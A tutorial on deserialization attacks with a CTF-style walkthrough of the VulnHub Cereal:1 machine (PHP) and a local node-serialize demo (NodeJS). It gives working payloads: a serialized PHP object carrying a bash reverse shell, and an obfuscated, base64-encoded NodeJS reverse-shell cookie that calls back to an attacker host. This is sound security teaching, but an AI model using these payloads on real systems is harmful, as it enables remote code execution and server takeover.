**Deserialization attacks** are a type of attack that exploits vulnerabilities in object *serialization* and *deserialization* processes in applications that use object-oriented programming (*OOP*).

Serialization is the process of converting an object into a sequence of *bytes* that can be stored or transmitted over a network. Deserialization is the reverse process, in which a sequence of bytes is converted back to an object. Deserialization attacks occur when an attacker can manipulate the data being deserialized, which can lead to the *execution of malicious code* on the server.

Deserialization attacks can occur in different types of applications, including web applications, mobile applications and desktop applications. These attacks can be exploited in several ways, such as:
- Modify the serialized object before it is sent to the application, which can cause errors in deserialization and allow an attacker to execute malicious code.
- Send a malicious serialized object that exploits a vulnerability in the application to execute malicious code.
- Perform a *man-in-the-middle* attack to intercept and modify the serialized object before it reaches the application.

Deserialization attacks can be very dangerous, as they can allow an attacker to take complete control of the server or application under attack.

To prevent these attacks, it is important that applications properly validate and authenticate all data they receive before deserializing it. It is also important to use secure serialization and deserialization libraries and to regularly update all application libraries and components to fix potential vulnerabilities.

# Examples

## Example 1: PHP Deserialization Attack

For this example we will download the *.ova*, selecting the Mirror option, from *VulnHub*'s *Cereal:1* machine: [Cereal: 1](https://www.vulnhub.com/entry/cereal-1,703/). Once downloaded and installed, we have to make sure to put the machine in *bridged* mode so that the router assigns an IP to the machine and we can see it.

To make sure that the machine is connected and detectable, we can play with the **arp-scan** and **ping** tools:

```bash
arp-scan -I ens33 --localnet --ignoredups
ping -c 1 <IP>
```

We proceed to run the standard **nmap** scan to list the open ports:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

And then we launch with **nmap** a scan of services and automated scripts against the ports we have found:

```bash
nmap -sCV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 <IP>
```

On port *80* there is an instance of the **Apache2** service running. Let's do a directory scan with **gobuster**:

```bash
gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

We see that we have discovered the *admin* and *blog* directories. Let's try going to *blog*.

When we enter probably the resources load badly, this is because it does not find the resources by the domain *cereal.ctf*. To avoid this we should add it to */etc/hosts*, so that when allusion is made to *cereal.ctf*, it resolves to the machine's IP:

```
<IP> cereal.ctf
```

From now on, every time we want to go to the machine, instead of searching by IP, we will be able to search by cereal.ctf.

----
> Caution: When looking for cereal.ctf it will probably look for it in Internet, to avoid it we must put **\about:config** in the browser, then **browser.fixup.domainsuffixwhitelist.ctf** (in this case the extension of the domain is .ctf) and we mark it as boolean.
----

If we go back to the previous **nmap** scan, we can see that on port *44441* there is also another **Apache2** service running.

----
> If there are several ports where there is an **Apache** service running, we must test in all of them the recognition of subdomains, because it is possible that in one of the ports there are subdomains that in the other one there are not.
----

Let's perform a subdomain scan with **gobuster**:

```bash
gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```

We will find the subdomain *secure.cereal.ctf*. We also add the subdomain to */etc/hosts* to resolve the IP:

```
<IP> cereal.ctf secure.cereal.ctf
```

Now we can open it from *\http://secure.cereal.ctf:44441/*.

Let's listen with **tcpdump** on the *ens33* interface to see *ICMP* traces to see if we receive the ping from the web:

```bash
tcpdump -i ens33 -n
```

We can check that we are receiving the ping, so a command is actually being executed on the server.

As we have seen that it is running with **PHP**, we can try to put several things in the input to see if we can bypass it:

```bash
# Let's see if when executing the command in PHP, it is not sanitized and concatenates both commands
<ATTACKER_IP>;whoami

# Let's see if as the first is not a valid IP, the second is executed
1123213123 || whoami

# Let's see if as the first is a valid IP, the second will be executed
127.0.0.1 && id
```

As we have seen, none of these attempts have worked, so we can assume that the code is sanitized.

We will intercept the request with **BurpSuite**, putting our IP.

We can see that we are receiving a url-encoded object by the format it has (we can also see it on the right side of the *repeater*, in the *Decoded from:* section), so to remove this format we can press *CTRL+Shift+U* to see it better:

```bash
obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A14%3A%22192.168.50.172%22%3B%7D&ip=192.168.50.172

# It is an object that is 8 characters long and has two properties or attributes
# s:9 indicates that it is a string and has 9 characters of length
obj=O:8:"pingTest":1:{s:9:"ipAddress";s:14:"192.168.50.172";}&ip=192.168.50.172
```

This object is sent to the server, which deserializes and interprets it, and based on what is sent, a method is executed.

Let's try to do a deeper scan of the directories contained in the subdomain with **gobuster**:

```bash
gobuster dir -u http://secure.cereal.ctf:44441/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```

We have discovered a directory called */back_en/* but it returns a *Forbidden* code, so we cannot see the resource. Despite not being able to see the resource, when we get a *Forbidden* code we can still try to brute force fuzz the existing internal files within the directory:

```bash
# In this case we list files that have the .php extension
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php

# In this case we list files that have the .php.bak extension (sometimes some files have an old backup copy)
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak
```

When running this last scan, we see that there is a file *index.php.bak*, so if we access the URL *\http://secure.cereal.ctf:44441/back_en/index.php.bak* we can analyze its source code.

We see that the following *.php* class exists in the source code:

```php
<?php
    class pingTest {
        public $ipAddress = "127.0.0.1";
        public $isValid = False;
        public $output = "";

        function validate() {
            if (!$this->isValid) {
                if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
                {
                    $this->isValid = True;
                }
            }
            $this->ping();
        }

        public function ping() {
            if ($this->isValid) {
                $this->output = shell_exec("ping -c 3 $this->ipAddress");	
            }
        }
    }
?>
```

As far as we can see, we need the *isValid* variable to be *True* in order to execute the command we want. For this we can try to modify the object that is sent.

We are going to copy the structure of the class we are interested in sending:

```php
class pingTest {
	public $ipAddress = "127.0.0.1";
    public $isValid = False;
    public $output = "";
}
```

Now we are going to modify it to our taste putting the variable *IsValid* to *True*, that was the condition so that our code was executed, we put the code that we want (in this case a *reverse shell*), we serialize it and we url-encode it so that it is sent to the server in the original format (we are going to create this script and name it *script.php*):

```php
<?php
	class pingTest {
		public $ipAddress = "; bash -c 'bash -i >& /dev/tcp<ATTACKER_IP>/443 0>&1'";
	    public $isValid = True;
	    public $output = "";
	}
	
	echo urlencode(serialize(new pingTest));
?>
```

We listen on port *443* with *netcat* and send the data through **BurpSuite**:

```
obj=O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A55%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.50.172%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D&ip=192.168.50.172
```

We have been able to obtain the *reverse shell* in this case, having performed a *PHP Deserialization Attack* so that we have managed to control the object to execute an alternative action or enter a portion of code where we could not enter at first.

## Example 2: NodeJS Deserialization Attack

For the code snippets we will be looking at later we will be looking at [this web page](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

First we will save the following script in a file called server.js:

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
```

Then we will install the necessary packages for the script execution:

```bash
npm install express node-serialize cookie-parser
```

Finally we will proceed to execute the script, which will be listening and will enable the server, which we will be able to access from port *3000*:

```bash
node server.js
```

When intercepting the request with **BurpSuite** we see the following field in the *Cookie* parameter:

```
Cookie: profile=eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0%3D
```

We see that it is a *url-encoded* value, so if we pass the value to the **BurpSuite** *decoder*, and decode it we see that it is a *base64* value, so if we decode it again we get the following result:

```bash
# Url-encoded
eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0%3D

# Base64
eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=

# Plain-text
{"username":"ajin","country":"india","city":"bangalore"}
```

----
> If the string starts with *ey* this is usually equal to the beginning of *brackets* and we can guess that it is *base64*.
----

We could modify these values, url-encode it again (*CTRL+U* in **BurpSuite**) and send it in the request to be able to modify this field.

We are going to save the following script in a *serialize.js* file:

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

This script will serialize the parameter that we pass it (in this case *ls /*) but it will not be executed immediately when serializing it. If we want it to be executed immediately we must convert it into an **IIFE** (Immediately Invoked Function Expression), putting parenthesis at the end of the function:

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

The problem we have now is that we need the script to run on deserialization, not serialization, so we are going to leave the script without converting the function to an **IIFE** and use this other script, *unserialize.js*:

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

In this case we are going to put our own payload, which is the result of our script *serialize.js*, but we must pay attention to eliminate the line breaks and escape the single quotation marks::

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) }); }"}';
serialize.unserialize(payload);
```

In addition, as in the previous example, we can convert the function to **IIFE** so that it is executed immediately upon deserialization:

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) }); }()"}';
serialize.unserialize(payload);
```

If we now run *node deserialize.js* we should be able to execute the command we included before.

Having all this clear, let's proceed to download this script written in *Python* with **wget**: [nodejsshell.py](https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py).

This script will allow us to generate a payload which we will serialize, convert to base64 and send to the server, which will allow us to start a *reverse shell*. Its mode of use is as follows:

```bash
python2.7 nodejsshell.py <ATTACKER_IP> <ATTACKER_PORT>
```

When executing this script it will generate the payload, this payload we have to serialize it, for this we will use one of the previous examples (we must convert the function to **IIFE**):

```
{"rce":"_$$ND_FUNC$$_function(){<PAYLOAD>}()"}

{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,48,46,49,55,50,34,59,10,80,79,82,84,61,34,52,52,52,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Before sending all this we must convert it to *base64*:

```bash
# With -w 0 we make sure that we print everything on one line.
cat data | base64 -w 0; echo
```

Now we just have to open with **netcat** the listening port we specified to the **nodejsshell.py** tool and we can send the text in the *Cookie* field:

```
profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNDgsNDYsNDksNTUsNTAsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNTIsNTIsNTIsNTQsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0K
```

If everything went well, we will have obtained a *reverse shell* on our machine, which we can turn into an interactive console with the *script /dev/null -c bash* command.